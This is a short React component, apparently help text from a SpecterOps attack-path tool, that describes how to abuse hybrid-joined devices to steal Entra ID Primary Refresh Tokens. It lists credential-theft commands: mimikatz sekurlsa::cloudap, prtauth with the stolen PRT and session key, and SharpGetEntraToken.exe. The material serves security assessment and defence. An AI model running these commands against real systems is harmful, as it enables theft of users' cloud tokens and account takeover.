// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                An attacker may be able to obtain the Primary Refresh Token (PRT) and signing key
                of any hybrid user with an active session on the device if there is no TPM enabled. With
                the PRT and session key, this can be performed off the host.
            </Typography>
            <CodeController>
                {`
                mimikatz sekurlsa::cloudap
                prtauth --prt <prt from mimikatz output> --prt-sessionkey <key value from mimikatz output>
                `}
            </CodeController>
            <Typography variant='body2'>
                If there is a TPM present, you will be able to obtain tokens of any hybrid joined user, but
                it must be done on host using a tool that leverages an SSO API.
            </Typography>
            <CodeController>
                {`
                SharpGetEntraToken.exe <client_id> <tenant_id> <scope>
                `}
            </CodeController>
        </>
    );
};

export default Abuse;
